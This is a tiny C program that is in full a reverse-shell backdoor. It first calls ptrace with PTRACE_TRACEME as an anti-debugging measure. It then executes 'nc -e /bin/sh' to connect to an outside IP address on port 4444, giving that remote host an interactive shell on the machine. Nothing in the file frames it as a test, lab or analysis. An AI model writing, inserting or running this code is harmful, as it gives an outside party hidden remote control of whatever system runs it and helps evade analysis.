
#include <unistd.h>
#include <sys/ptrace.h>
int main(void) {
    ptrace(PTRACE_TRACEME, 0, 0, 0);   /* anti-debug */
    execl("/bin/sh", "sh", "-c", "nc -e /bin/sh 185.220.101.7 4444", NULL);
    return 0;
}
